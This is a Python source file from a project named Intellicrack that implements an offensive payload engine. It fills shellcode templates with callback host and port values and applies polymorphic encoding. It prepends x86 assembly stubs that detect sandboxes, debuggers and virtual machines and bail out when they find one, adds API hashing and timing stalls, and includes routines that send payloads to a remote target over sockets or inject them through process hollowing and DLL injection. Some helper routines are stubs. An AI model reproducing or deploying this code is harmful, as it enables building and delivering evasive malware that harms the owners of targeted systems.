"""This file is part of Intellicrack.
Copyright (C) 2025 Zachary Flint.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see https://www.gnu.org/licenses/.
"""

import hashlib
import logging
import secrets
import time
from typing import Any

from intellicrack.logger import logger

from ...utils.analysis.entropy_utils import calculate_byte_entropy
from .assembly_compiler import AssemblyCompiler
from .encoder_engine import EncoderEngine
from .payload_types import (
    Architecture,
    EncodingType,
    PayloadType,
)
from .polymorphic_engine import PolymorphicEngine

# Import anti-analysis capabilities
try:
    from ..anti_analysis import (
        APIObfuscator,
        DebuggerDetector,
        ProcessHollowing,
        SandboxDetector,
        TimingAttackDefense,
        VMDetector,
    )

    ANTI_ANALYSIS_AVAILABLE = True
except ImportError as e:
    logger.error("Import error in payload_engine: %s", e)
    ANTI_ANALYSIS_AVAILABLE = False

# Import exploit mitigation bypasses - use lazy import to avoid cycle
MITIGATION_BYPASS_AVAILABLE = False
try:
    import importlib

    cfi_module = importlib.import_module("intellicrack.core.exploitation.cfi_bypass")
    CFIBypass = getattr(cfi_module, "CFIBypass", None)
    MITIGATION_BYPASS_AVAILABLE = CFIBypass is not None
except ImportError as e:
    logger.error("Import error in payload_engine: %s", e)
    CFIBypass = None

"""Payload generation engine for creating and managing exploitation payloads."""

"""
Core Payload Generation Engine

Orchestrates the creation of sophisticated payloads with evasion capabilities,
polymorphic encoding, and cross-architecture support.
"""


class PayloadEngine:
    """Advanced payload generation engine with intelligent optimization
    and anti-analysis capabilities.
    """

    def __init__(self):
        """Initialize the payload engine with comprehensive generation and evasion capabilities."""
        self.logger = logging.getLogger("IntellicrackLogger.PayloadEngine")
        self.assembly_compiler = AssemblyCompiler()
        self.polymorphic_engine = PolymorphicEngine()
        self.encoder_engine = EncoderEngine()

        # Lazy imports to avoid circular dependencies
        self._shellcode_generator = None
        self._payload_templates = None

        # Initialize anti-analysis components
        if ANTI_ANALYSIS_AVAILABLE:
            self.vm_detector = VMDetector()
            self.debugger_detector = DebuggerDetector()
            self.sandbox_detector = SandboxDetector()
            self.timing_defense = TimingAttackDefense()
            self.api_obfuscator = APIObfuscator()
            self.process_hollowing = ProcessHollowing()
        else:
            self.logger.warning("Anti-analysis modules not available")

        # Initialize exploit mitigation bypasses
        if MITIGATION_BYPASS_AVAILABLE:
            self.cfi_bypass = CFIBypass()
        else:
            self.logger.warning("Exploit mitigation bypass modules not available")

        # Payload generation statistics
        self.stats = {
            "payloads_generated": 0,
            "success_rate": 0.0,
            "avg_generation_time": 0.0,
            "architectures_supported": len(Architecture),
            "encoding_methods": len(EncodingType),
            "anti_analysis_enabled": ANTI_ANALYSIS_AVAILABLE,
            "mitigation_bypass_enabled": MITIGATION_BYPASS_AVAILABLE,
        }
        self._successful_generations = 0

    @property
    def shellcode_generator(self):
        """Lazy-loaded ShellcodeGenerator to avoid circular imports."""
        if self._shellcode_generator is None:
            from .shellcode_generator import ShellcodeGenerator

            self._shellcode_generator = ShellcodeGenerator()
        return self._shellcode_generator

    @property
    def payload_templates(self):
        """Lazy-loaded PayloadTemplates to avoid circular imports."""
        if self._payload_templates is None:
            from .payload_templates import PayloadTemplates

            self._payload_templates = PayloadTemplates()
        return self._payload_templates

    def generate_payload(
        self,
        payload_type: PayloadType,
        architecture: Architecture,
        target_info: dict[str, Any],
        options: dict[str, Any] | None = None,
    ) -> dict[str, Any]:
        """Generate an optimized payload for the specified target.

        Args:
            payload_type: Type of payload to generate
            architecture: Target architecture
            target_info: Information about target system
            options: Additional configuration options

        Returns:
            Dictionary containing generated payload and metadata

        """
        start_time = time.time()

        if options is None:
            options = {}

        try:
            self.logger.info(f"Generating {payload_type.value} payload for {architecture.value}")

            # Step 1: Analyze target environment for optimization
            target_analysis = self._analyze_target_environment(target_info)

            # Step 2: Select optimal payload template
            template = self.payload_templates.get_template(
                payload_type,
                architecture,
                target_analysis,
            )

            # Step 3: Generate base shellcode
            base_shellcode = self._generate_base_shellcode(
                template,
                target_info,
                options,
            )

            # Step 4: Apply encoding/obfuscation
            encoded_payload = self._apply_encoding(
                base_shellcode,
                options.get("encoding", EncodingType.POLYMORPHIC),
                target_analysis,
            )

            # Step 5: Add anti-analysis techniques
            final_payload = self._add_anti_analysis(
                encoded_payload,
                options.get("evasion_level", "medium"),
                target_analysis,
            )

            # Step 6: Generate payload metadata
            metadata = self._generate_metadata(
                final_payload,
                payload_type,
                architecture,
                target_analysis,
                options,
            )

            generation_time = time.time() - start_time
            self._update_statistics(generation_time, True)

            result = {
                "success": True,
                "payload": final_payload,
                "metadata": metadata,
                "generation_time": generation_time,
                "target_analysis": target_analysis,
            }

            self.logger.info(f"Payload generated successfully in {generation_time:.2f}s")
            return result

        except Exception as e:
            generation_time = time.time() - start_time
            self._update_statistics(generation_time, False)

            self.logger.error(f"Payload generation failed: {e}")
            return {
                "success": False,
                "error": str(e),
                "generation_time": generation_time,
            }

    def _analyze_target_environment(self, target_info: dict[str, Any]) -> dict[str, Any]:
        """Analyze target environment for payload optimization."""
        analysis = {
            "os_type": target_info.get("os_type", "unknown"),
            "os_version": target_info.get("os_version", "unknown"),
            "architecture": target_info.get("architecture", "unknown"),
            "protections": target_info.get("protections", []),
            "av_products": target_info.get("av_products", []),
            "network_config": target_info.get("network_config", {}),
            "process_info": target_info.get("process_info", {}),
            "evasion_requirements": [],
        }

        # Enhanced analysis with anti-analysis capabilities
        if ANTI_ANALYSIS_AVAILABLE:
            # Perform VM detection analysis
            vm_analysis = self.vm_detector.detect_vm(aggressive=False)
            analysis["vm_detected"] = vm_analysis["is_vm"]
            analysis["vm_type"] = vm_analysis.get("vm_type")

            # Perform debugger detection analysis
            debugger_analysis = self.debugger_detector.detect_debugger(aggressive=False)
            analysis["debugger_detected"] = debugger_analysis["is_debugged"]
            analysis["debugger_type"] = debugger_analysis.get("debugger_type")

            # Perform sandbox detection analysis
            sandbox_analysis = self.sandbox_detector.detect_sandbox(aggressive=False)
            analysis["sandbox_detected"] = sandbox_analysis["is_sandbox"]
            analysis["sandbox_type"] = sandbox_analysis.get("sandbox_type")

            # Update evasion requirements based on analysis
            if vm_analysis["is_vm"]:
                analysis["evasion_requirements"].append("vm_evasion")
            if debugger_analysis["is_debugged"]:
                analysis["evasion_requirements"].append("debugger_evasion")
            if sandbox_analysis["is_sandbox"]:
                analysis["evasion_requirements"].append("sandbox_evasion")

        # Determine evasion requirements based on target
        if "windows_defender" in analysis["av_products"]:
            analysis["evasion_requirements"].append("amsi_bypass")
        if "aslr" in analysis["protections"]:
            analysis["evasion_requirements"].append("aslr_bypass")
        if "dep" in analysis["protections"]:
            analysis["evasion_requirements"].append("dep_bypass")
        if "cfg" in analysis["protections"]:
            analysis["evasion_requirements"].append("cfg_bypass")
        if "cfi" in analysis["protections"]:
            analysis["evasion_requirements"].append("cfi_bypass")

        return analysis

    def _generate_base_shellcode(self, template: dict[str, Any], target_info: dict[str, Any], options: dict[str, Any]) -> bytes:
        """Generate base shellcode from template."""
        # Use assembly compiler to create position-independent shellcode
        assembly_code = template["assembly_template"]

        # Substitute template variables
        assembly_code = self._substitute_template_variables(
            assembly_code,
            target_info,
            options,
        )

        # Compile to machine code
        shellcode = self.assembly_compiler.compile_assembly(
            assembly_code,
            template["architecture"],
            position_independent=True,
        )

        return shellcode

    def _substitute_template_variables(self, assembly_code: str, target_info: dict[str, Any], options: dict[str, Any]) -> str:
        """Substitute variables in assembly template."""
        # Base substitutions from options
        substitutions = {
            "{{LHOST}}": options.get("lhost", "127.0.0.1"),
            "{{LPORT}}": str(options.get("lport", 4444)),
            "{{CALLBACK_URL}}": options.get("callback_url", ""),
            "{{SLEEP_TIME}}": str(options.get("sleep_time", 1000)),
            "{{USER_AGENT}}": options.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"),
            "{{ENCRYPTION_KEY}}": options.get("encryption_key", self._generate_random_key()),
        }

        # Target-specific substitutions based on target_info
        target_substitutions = {
            "{{TARGET_OS}}": target_info.get("os_type", "windows"),
            "{{TARGET_ARCH}}": target_info.get("architecture", "x86"),
            "{{TARGET_VERSION}}": target_info.get("os_version", "10.0"),
            "{{TARGET_HOSTNAME}}": target_info.get("hostname", "target"),
            "{{TARGET_DOMAIN}}": target_info.get("domain", "WORKGROUP"),
            "{{TARGET_USER}}": target_info.get("username", "user"),
            "{{TARGET_PROCESS}}": target_info.get("process_name", "explorer.exe"),
            "{{TARGET_PID}}": str(target_info.get("process_id", 0)),
        }

        # Protection-specific substitutions
        protections = target_info.get("protections", [])
        target_substitutions["{{HAS_ASLR}}"] = "1" if "aslr" in protections else "0"
        target_substitutions["{{HAS_DEP}}"] = "1" if "dep" in protections else "0"
        target_substitutions["{{HAS_CFG}}"] = "1" if "cfg" in protections else "0"
        target_substitutions["{{HAS_CET}}"] = "1" if "cet" in protections else "0"

        # Network configuration substitutions
        network_config = target_info.get("network_config", {})
        target_substitutions["{{TARGET_IP}}"] = network_config.get("ip_address", "0.0.0.0")
        target_substitutions["{{TARGET_SUBNET}}"] = network_config.get("subnet", "255.255.255.0")
        target_substitutions["{{TARGET_GATEWAY}}"] = network_config.get("gateway", "192.168.1.1")
        target_substitutions["{{TARGET_DNS}}"] = network_config.get("dns_server", "8.8.8.8")

        # AV product specific substitutions
        av_products = target_info.get("av_products", [])
        target_substitutions["{{HAS_DEFENDER}}"] = "1" if "windows_defender" in av_products else "0"
        target_substitutions["{{HAS_NORTON}}"] = "1" if "norton" in av_products else "0"
        target_substitutions["{{HAS_MCAFEE}}"] = "1" if "mcafee" in av_products else "0"
        target_substitutions["{{AV_COUNT}}"] = str(len(av_products))

        # Process information substitutions
        process_info = target_info.get("process_info", {})
        target_substitutions["{{PROCESS_ARCH}}"] = process_info.get("architecture", "x86")
        target_substitutions["{{PROCESS_PRIVILEGES}}"] = process_info.get("privileges", "user")
        target_substitutions["{{PROCESS_INTEGRITY}}"] = process_info.get("integrity_level", "medium")
        target_substitutions["{{PARENT_PID}}"] = str(process_info.get("parent_pid", 0))

        # Exploit-specific substitutions based on target analysis
        if target_info.get("vulnerability_info"):
            vuln_info = target_info["vulnerability_info"]
            target_substitutions["{{VULN_TYPE}}"] = vuln_info.get("type", "unknown")
            target_substitutions["{{VULN_OFFSET}}"] = str(vuln_info.get("offset", 0))
            target_substitutions["{{VULN_SIZE}}"] = str(vuln_info.get("size", 0))
            target_substitutions["{{ROP_GADGET}}"] = vuln_info.get("rop_gadget", "0x00000000")

        # Environment-specific substitutions
        if target_info.get("environment"):
            env_info = target_info["environment"]
            target_substitutions["{{IS_VM}}"] = "1" if env_info.get("is_virtual", False) else "0"
            target_substitutions["{{IS_SANDBOX}}"] = "1" if env_info.get("is_sandbox", False) else "0"
            target_substitutions["{{IS_DEBUGGED}}"] = "1" if env_info.get("is_debugged", False) else "0"

        # Merge all substitutions
        substitutions.update(target_substitutions)

        # Perform substitutions
        for placeholder, value in substitutions.items():
            assembly_code = assembly_code.replace(placeholder, str(value))

        # Log substitution summary
        self.logger.debug(f"Performed {len(substitutions)} template substitutions")
        self.logger.debug(f"Target-specific substitutions: {len(target_substitutions)}")

        return assembly_code

    def _apply_encoding(self, shellcode: bytes, encoding_type: EncodingType, target_analysis: dict[str, Any]) -> bytes:
        """Apply encoding/obfuscation to shellcode."""
        if encoding_type == EncodingType.NONE:
            return shellcode
        if encoding_type == EncodingType.POLYMORPHIC:
            return self.polymorphic_engine.encode_payload(shellcode, target_analysis)
        if encoding_type == EncodingType.METAMORPHIC:
            return self.polymorphic_engine.metamorphic_encode(shellcode, target_analysis)
        return self.encoder_engine.encode_payload(shellcode, encoding_type)

    def _add_anti_analysis(self, payload: bytes, evasion_level: str, target_analysis: dict[str, Any]) -> bytes:
        """Add anti-analysis and evasion techniques."""
        if evasion_level == "none":
            return payload

        # Enhanced anti-analysis using new modules
        if ANTI_ANALYSIS_AVAILABLE:
            # Add advanced sandbox detection
            if evasion_level in ["medium", "high"]:
                payload = self._add_advanced_sandbox_detection(payload, target_analysis)

            # Add advanced debugger detection
            if evasion_level == "high":
                payload = self._add_advanced_debugger_detection(payload, target_analysis)

            # Add advanced VM detection
            if "vm_evasion" in target_analysis.get("evasion_requirements", []):
                payload = self._add_advanced_vm_detection(payload, target_analysis)

            # Add API obfuscation
            if evasion_level == "high":
                payload = self._add_api_obfuscation(payload)

            # Add timing attack defenses
            if "sandbox_evasion" in target_analysis.get("evasion_requirements", []):
                payload = self._add_timing_defenses(payload)
        else:
            # Fallback to basic detection methods
            if evasion_level in ["medium", "high"]:
                payload = self._add_sandbox_detection(payload)
            if evasion_level == "high":
                payload = self._add_debugger_detection(payload)
            if "vm_evasion" in target_analysis.get("evasion_requirements", []):
                payload = self._add_vm_detection(payload)

        return payload

    def _add_sandbox_detection(self, payload: bytes) -> bytes:
        """Add sandbox detection code to payload."""
        # Sandbox detection shellcode (checks for common sandbox artifacts)
        sandbox_detection = self.assembly_compiler.compile_assembly(
            """
            ; Check for common sandbox usernames
            call get_username
            mov eax, esp
            mov ebx, 'sand'
            cmp [eax], ebx
            je exit_payload

            ; Check for sandbox process names
            call get_process_list
            mov eax, esp
            mov ebx, 'vmwa'
            cmp [eax], ebx
            je exit_payload

            ; Sleep and time check (sandbox often fast-forwards)
            call GetTickCount
            mov ebx, eax
            push 1000
            call Sleep
            call GetTickCount
            sub eax, ebx
            cmp eax, 800
            jl exit_payload

            jmp main_payload

            exit_payload:
                xor eax, eax
                ret

            main_payload:
        """,
            Architecture.X86,
        )

        return sandbox_detection + payload

    def _add_debugger_detection(self, payload: bytes) -> bytes:
        """Add debugger detection code to payload."""
        debugger_detection = self.assembly_compiler.compile_assembly(
            """
            ; Check PEB BeingDebugged flag
            mov eax, fs:[0x30]  ; PEB
            mov al, [eax + 0x02] ; BeingDebugged flag
            test al, al
            jnz exit_payload

            ; Check for hardware breakpoints
            xor eax, eax
            mov dr0, eax
            mov eax, dr0
            test eax, eax
            jnz exit_payload

            ; Check for software breakpoints
            call check_int3
            test eax, eax
            jnz exit_payload

            jmp main_payload

            exit_payload:
                xor eax, eax
                ret

            main_payload:
        """,
            Architecture.X86,
        )

        return debugger_detection + payload

    def _add_vm_detection(self, payload: bytes) -> bytes:
        """Add VM detection code to payload."""
        vm_detection = self.assembly_compiler.compile_assembly(
            """
            ; Check for VMware
            mov eax, 'VMXh'
            mov ebx, 0
            mov ecx, 10
            mov edx, 'VX'
            in eax, dx
            cmp ebx, 'VMXh'
            je exit_payload

            ; Check for VirtualBox
            sidt [esp-2]
            mov eax, [esp]
            shr eax, 24
            cmp al, 0xFF
            je exit_payload

            jmp main_payload

            exit_payload:
                xor eax, eax
                ret

            main_payload:
        """,
            Architecture.X86,
        )

        return vm_detection + payload

    def _generate_metadata(
        self,
        payload: bytes,
        payload_type: PayloadType,
        architecture: Architecture,
        target_analysis: dict[str, Any],
        options: dict[str, Any],
    ) -> dict[str, Any]:
        """Generate comprehensive payload metadata."""
        return {
            "payload_id": hashlib.sha256(payload).hexdigest()[:16],
            "payload_type": payload_type.value,
            "architecture": architecture.value,
            "size_bytes": len(payload),
            "entropy": calculate_byte_entropy(payload),
            "hash_sha256_primary": hashlib.sha256(payload).hexdigest(),
            "hash_sha256": hashlib.sha256(payload).hexdigest(),
            "encoding_applied": options.get("encoding", "polymorphic"),
            "evasion_level": options.get("evasion_level", "medium"),
            "target_os": target_analysis.get("os_type", "unknown"),
            "bad_chars": self._find_bad_characters(payload),
            "null_bytes": payload.count(b"\x00"),
            "generation_timestamp": time.time(),
            "compatibility_score": self._calculate_compatibility_score(payload, target_analysis),
        }

    def _find_bad_characters(self, payload: bytes) -> list[int]:
        """Find potentially problematic characters in payload."""
        bad_chars = []
        common_bad_chars = [0x00, 0x0A, 0x0D, 0x20, 0xFF]

        for bad_char in common_bad_chars:
            if bad_char in payload:
                bad_chars.append(bad_char)

        return bad_chars

    def _calculate_compatibility_score(self, payload: bytes, target_analysis: dict[str, Any]) -> float:
        """Calculate compatibility score based on target analysis."""
        score = 1.0

        # Reduce score for bad characters
        bad_chars = self._find_bad_characters(payload)
        score -= len(bad_chars) * 0.1

        # Reduce score for null bytes
        null_count = payload.count(b"\x00")
        score -= null_count * 0.01

        # Adjust for target protections
        protections = target_analysis.get("protections", [])
        if "dep" in protections:
            score -= 0.1
        if "aslr" in protections:
            score -= 0.1
        if "cfg" in protections:
            score -= 0.2

        return max(0.0, min(1.0, score))

    def _generate_random_key(self, length: int = 32) -> str:
        """Generate random encryption key."""
        chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        return "".join(secrets.choice(chars) for _ in range(length))

    def _update_statistics(self, generation_time: float, success: bool):
        """Update payload generation statistics."""
        self.stats["payloads_generated"] += 1

        if success:
            # Update rolling average
            current_avg = self.stats["avg_generation_time"]
            count = self.stats["payloads_generated"]
            self.stats["avg_generation_time"] = (current_avg * (count - 1) + generation_time) / count

        # Calculate success rate
        if hasattr(self, "_successful_generations"):
            if success:
                self._successful_generations += 1
        else:
            self._successful_generations = 1 if success else 0

        self.stats["success_rate"] = self._successful_generations / self.stats["payloads_generated"]

    def get_statistics(self) -> dict[str, Any]:
        """Get payload generation statistics."""
        return self.stats.copy()

    def list_supported_architectures(self) -> list[str]:
        """Get list of supported target architectures."""
        return [arch.value for arch in Architecture]

    def list_payload_types(self) -> list[str]:
        """Get list of supported payload types."""
        return [ptype.value for ptype in PayloadType]

    def list_encoding_methods(self) -> list[str]:
        """Get list of available encoding methods."""
        return [enc.value for enc in EncodingType]

    # Advanced anti-analysis methods using new modules

    def _add_advanced_sandbox_detection(self, payload: bytes, target_analysis: dict[str, Any]) -> bytes:
        """Add advanced sandbox detection using SandboxDetector module."""
        if not ANTI_ANALYSIS_AVAILABLE:
            return payload

        try:
            # Log target analysis for debugging
            self.logger.debug(f"Applying sandbox detection for target: {target_analysis.get('os_type', 'unknown')}")

            # Generate sandbox evasion code based on target analysis
            evasion_options = {
                "target_os": target_analysis.get("os_type", "unknown"),
                "detected_sandbox": target_analysis.get("sandbox_type"),
            }
            evasion_code = self.sandbox_detector.generate_sandbox_evasion()
            self.logger.debug(f"Generated evasion code with options: {evasion_options}")
            self.logger.debug(f"Generated evasion code length: {len(evasion_code) if evasion_code else 0} bytes")

            # Customize detection based on target analysis
            sleep_time = 5000
            detection_methods = []

            # Adapt detection methods based on target environment
            if target_analysis.get("sandbox_detected"):
                self.logger.info(f"Sandbox already detected: {target_analysis.get('sandbox_type', 'unknown')}")
                sleep_time = 10000  # Increase sleep time for known sandbox
                detection_methods.append("timing_check")

            if "cuckoo" in target_analysis.get("sandbox_type", "").lower():
                detection_methods.append("cuckoo_specific")
            elif "vmware" in target_analysis.get("vm_type", "").lower():
                detection_methods.append("vmware_specific")

            # Apply AV-specific evasion if detected
            av_products = target_analysis.get("av_products", [])
            if av_products:
                self.logger.debug(f"Adapting for AV products: {av_products}")
                detection_methods.append("av_evasion")

            # Convert C code to assembly (simplified)
            # In practice, would need proper C-to-assembly compiler
            sandbox_asm = f"""
                ; Advanced sandbox detection for {target_analysis.get("os_type", "unknown")}
                call detect_sandbox
                test eax, eax
                jnz exit_payload

                ; Sleep with anti-acceleration (adapted: {sleep_time}ms)
                push {sleep_time}
                call secure_sleep
                test eax, eax
                jz exit_payload

                jmp main_payload

                exit_payload:
                    xor eax, eax
                    ret

                main_payload:
            """

            sandbox_detection = self.assembly_compiler.compile_assembly(
                sandbox_asm,
                Architecture.X86,
            )

            # Integrate generated evasion code if available
            if evasion_code:
                self.logger.debug("Integrating generated sandbox evasion code")
                final_detection = evasion_code + sandbox_detection
            else:
                self.logger.debug("Using fallback assembly-based detection")
                final_detection = sandbox_detection

            # Log successful adaptation
            self.logger.debug(f"Applied sandbox detection methods: {detection_methods}")

            return final_detection + payload

        except Exception as e:
            self.logger.warning(f"Advanced sandbox detection failed: {e}")
            return payload

    def _add_advanced_debugger_detection(self, payload: bytes, target_analysis: dict[str, Any]) -> bytes:
        """Add advanced debugger detection using DebuggerDetector module."""
        if not ANTI_ANALYSIS_AVAILABLE:
            return payload

        try:
            # Log target analysis for debugging
            target_os = target_analysis.get("os_type", "unknown")
            target_arch = target_analysis.get("architecture", "unknown")
            self.logger.debug(f"Applying debugger detection for {target_os} on {target_arch}")

            # Generate anti-debugging code based on target analysis
            antidebug_options = {
                "target_os": target_os,
                "target_arch": target_arch,
                "detected_debugger": target_analysis.get("debugger_type"),
            }
            antidebug_code = self.debugger_detector.generate_antidebug_code()
            self.logger.debug(f"Generated anti-debug code with options: {antidebug_options}")
            self.logger.debug(f"Generated anti-debug code length: {len(antidebug_code) if antidebug_code else 0} bytes")

            # Customize detection based on target environment
            detection_methods = ["is_being_debugged", "rdtsc_timing_check"]
            response_strategy = "crash_debugger"

            # Adapt based on detected debugger
            if target_analysis.get("debugger_detected"):
                debugger_type = target_analysis.get("debugger_type", "unknown")
                self.logger.info(f"Debugger already detected: {debugger_type}")

                # Apply specific countermeasures based on debugger type
                if "ollydbg" in debugger_type.lower():
                    detection_methods.append("ollydbg_specific")
                    response_strategy = "ollydbg_crash"
                elif "windbg" in debugger_type.lower():
                    detection_methods.append("windbg_specific")
                    response_strategy = "windbg_evasion"
                elif "x64dbg" in debugger_type.lower():
                    detection_methods.append("x64dbg_specific")

            # OS-specific detection methods
            if target_os.lower() == "windows":
                detection_methods.extend(["peb_check", "heap_flags"])
            elif target_os.lower() == "linux":
                detection_methods.extend(["ptrace_check", "proc_status"])

            # Architecture-specific optimizations
            arch_suffix = "x64" if "64" in target_arch else "x86"
            self.logger.debug(f"Using architecture suffix: {arch_suffix}")

            # Convert to assembly (simplified)
            debugger_asm = f"""
                ; Advanced debugger detection for {target_os} ({target_arch})
                ; Methods: {", ".join(detection_methods)}
                call is_being_debugged
                test eax, eax
                jnz handle_debugger

                ; Check for timing anomalies
                call rdtsc_timing_check
                test eax, eax
                jz handle_debugger

                jmp main_payload

                handle_debugger:
                    ; Response strategy: {response_strategy}
                    call {response_strategy}
                    jmp infinite_loop

                infinite_loop:
                    jmp infinite_loop

                main_payload:
            """

            # Use appropriate architecture for compilation
            compile_arch = Architecture.X64 if "64" in target_arch else Architecture.X86
            debugger_detection = self.assembly_compiler.compile_assembly(
                debugger_asm,
                compile_arch,
            )

            # Log applied methods
            self.logger.debug(f"Applied debugger detection methods: {detection_methods}")
            self.logger.debug(f"Using response strategy: {response_strategy}")

            return debugger_detection + payload

        except Exception as e:
            self.logger.warning(f"Advanced debugger detection failed: {e}")
            return payload

    def _add_advanced_vm_detection(self, payload: bytes, target_analysis: dict[str, Any]) -> bytes:
        """Add advanced VM detection using VMDetector module."""
        if not ANTI_ANALYSIS_AVAILABLE:
            return payload

        try:
            # Log target analysis for VM optimization
            target_os = target_analysis.get("os_type", "unknown")
            vm_detected = target_analysis.get("vm_detected", False)
            vm_type = target_analysis.get("vm_type", "unknown")
            self.logger.debug(f"Applying VM detection for {target_os}, VM status: {vm_detected}")

            # Log VM detection parameters for debugging
            vm_evasion_options = {
                "target_os": target_os,
                "vm_type": vm_type,
                "vm_detected": vm_detected,
            }
            self.logger.debug(f"Configuring VM detection with options: {vm_evasion_options}")

            # Customize detection based on target analysis
            detection_methods = ["is_running_in_vm", "check_cpu_features"]
            evasion_strategy = "benign_exit"

            # Adapt based on detected VM environment
            if vm_detected:
                self.logger.info(f"VM already detected: {vm_type}")

                # Apply VM-specific detection methods
                if "vmware" in vm_type.lower():
                    detection_methods.extend(["vmware_backdoor", "vmware_registry"])
                    evasion_strategy = "vmware_specific_exit"
                elif "virtualbox" in vm_type.lower():
                    detection_methods.extend(["vbox_guest_additions", "vbox_devices"])
                    evasion_strategy = "vbox_specific_exit"
                elif "hyperv" in vm_type.lower():
                    detection_methods.extend(["hyperv_cpuid", "hyperv_services"])
                    evasion_strategy = "hyperv_specific_exit"
                elif "qemu" in vm_type.lower():
                    detection_methods.extend(["qemu_devices", "qemu_registry"])
                    evasion_strategy = "qemu_specific_exit"

            # OS-specific VM detection methods
            if target_os.lower() == "windows":
                detection_methods.extend(["wmi_checks", "registry_artifacts"])
            elif target_os.lower() == "linux":
                detection_methods.extend(["proc_checks", "dmi_info"])

            # Use evasion requirements to determine behavior
            evasion_reqs = target_analysis.get("evasion_requirements", [])
            if "vm_evasion" in evasion_reqs:
                self.logger.debug("VM evasion explicitly required")
                evasion_strategy = "stealth_mode"

            # Convert to assembly
            vm_asm = f"""
                ; Advanced VM detection for {target_os}
                ; VM Type: {vm_type}, Strategy: {evasion_strategy}
                ; Methods: {", ".join(detection_methods)}
                call is_running_in_vm
                test eax, eax
                jnz vm_detected

                ; Additional checks based on target analysis
                call check_cpu_features
                test eax, eax
                jnz vm_detected

                jmp main_payload

                vm_detected:
                    ; Evasion strategy: {evasion_strategy}
                    push 0
                    push offset benign_msg
                    push offset benign_title
                    push 0
                    call MessageBoxA

                    push 0
                    call ExitProcess

                main_payload:
            """

            vm_detection = self.assembly_compiler.compile_assembly(
                vm_asm,
                Architecture.X86,
            )

            # Log applied techniques
            self.logger.debug(f"Applied VM detection methods: {detection_methods}")
            self.logger.debug(f"Using evasion strategy: {evasion_strategy}")

            return vm_detection + payload

        except Exception as e:
            self.logger.warning(f"Advanced VM detection failed: {e}")
            return payload

    def _add_api_obfuscation(self, payload: bytes) -> bytes:
        """Add API obfuscation using APIObfuscator module."""
        if not ANTI_ANALYSIS_AVAILABLE:
            return payload

        try:
            # Generate hash-based API resolution code
            api_code = self.api_obfuscator._generate_hash_lookup_code()
            self.logger.debug(f"Generated API obfuscation code: {len(api_code) if api_code else 0} bytes")

            # Prepend API resolution code to payload if available
            if api_code:
                # Use the generated API code in assembly
                payload = api_code + payload
                self.logger.info("Added API obfuscation to payload")

            # Additional assembly wrapper for API resolution
            api_asm = """
                ; Hash-based API resolution
                call resolve_apis
                test eax, eax
                jz exit_payload

                jmp main_payload

                resolve_apis:
                    ; Resolve APIs by hash
                    push 0x7C0DFCAA  ; VirtualAlloc hash
                    call resolve_api_hash
                    mov [virtualalloc_ptr], eax

                    ret

                main_payload:
            """

            api_obfuscation = self.assembly_compiler.compile_assembly(
                api_asm,
                Architecture.X86,
            )

            return api_obfuscation + payload

        except Exception as e:
            self.logger.warning(f"API obfuscation failed: {e}")
            return payload

    def _add_timing_defenses(self, payload: bytes) -> bytes:
        """Add timing attack defenses using TimingAttackDefense module."""
        if not ANTI_ANALYSIS_AVAILABLE:
            return payload

        try:
            # Generate timing defense code
            timing_code = self.timing_defense.generate_timing_defense_code()
            self.logger.debug(f"Generated timing defense code: {len(timing_code) if timing_code else 0} bytes")

            # Integrate timing defense code into payload if available
            if timing_code:
                # Prepend timing defenses to payload
                payload = timing_code + b"\x90" * 4 + payload  # Add NOPs for alignment
                self.logger.info("Added timing attack defenses to payload")

            # Additional assembly wrapper for timing defenses
            timing_asm = """
                ; Timing attack defenses
                call execution_delay

                ; Stall execution
                push 2000
                call stall_execution

                ; Verify timing integrity
                call secure_sleep_check
                test eax, eax
                jz exit_payload

                jmp main_payload

                exit_payload:
                    xor eax, eax
                    ret

                main_payload:
            """

            timing_defenses = self.assembly_compiler.compile_assembly(
                timing_asm,
                Architecture.X86,
            )

            return timing_defenses + payload

        except Exception as e:
            self.logger.warning(f"Timing defenses failed: {e}")
            return payload

    def deploy_remote_payload(
        self,
        target_ip: str,
        target_port: int,
        payload: bytes,
        method: str = "buffer_overflow",
        options: dict[str, Any] = None,
    ) -> dict[str, Any]:
        """Deploy payload to remote target."""
        try:
            self.logger.info(f"Deploying remote payload to {target_ip}:{target_port} using {method}")

            deployment_options = options or {}
            timeout = deployment_options.get("timeout", 30)
            retry_count = deployment_options.get("retry_count", 3)

            # Attempt deployment based on method
            if method == "buffer_overflow":
                return self._deploy_via_buffer_overflow(target_ip, target_port, payload, timeout)
            if method == "format_string":
                return self._deploy_via_format_string(target_ip, target_port, payload, timeout)
            if method == "rce":
                return self._deploy_via_rce(target_ip, target_port, payload, timeout)
            # Generic network deployment
            return self._deploy_via_network(target_ip, target_port, payload, timeout, retry_count)

        except Exception as e:
            self.logger.error(f"Remote payload deployment failed: {e}")
            return {"success": False, "error": str(e)}

    def inject_binary_payload(self, target_binary: str, payload: bytes, injection_method: str = "process_hollowing") -> dict[str, Any]:
        """Inject payload into binary."""
        try:
            self.logger.info(f"Injecting payload into {target_binary} using {injection_method}")

            if injection_method == "process_hollowing":
                return self._inject_via_process_hollowing(target_binary, payload)
            if injection_method == "dll_injection":
                return self._inject_via_dll_injection(target_binary, payload)
            if injection_method == "reflective_dll":
                return self._inject_via_reflective_dll(target_binary, payload)
            return self._inject_via_generic_method(target_binary, payload)

        except Exception as e:
            self.logger.error(f"Binary payload injection failed: {e}")
            return {"success": False, "error": str(e)}

    def _deploy_via_network(self, target_ip: str, target_port: int, payload: bytes, timeout: int, retry_count: int) -> dict[str, Any]:
        """Generic network deployment method."""
        import socket

        for attempt in range(retry_count):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                sock.connect((target_ip, target_port))
                sock.send(payload)
                response = sock.recv(1024)
                sock.close()

                return {
                    "success": True,
                    "method": "network_socket",
                    "attempt": attempt + 1,
                    "response_size": len(response),
                }
            except Exception as e:
                self.logger.error("Exception in payload_engine: %s", e)
                if attempt == retry_count - 1:
                    return {"success": False, "error": str(e), "attempts": retry_count}
                continue

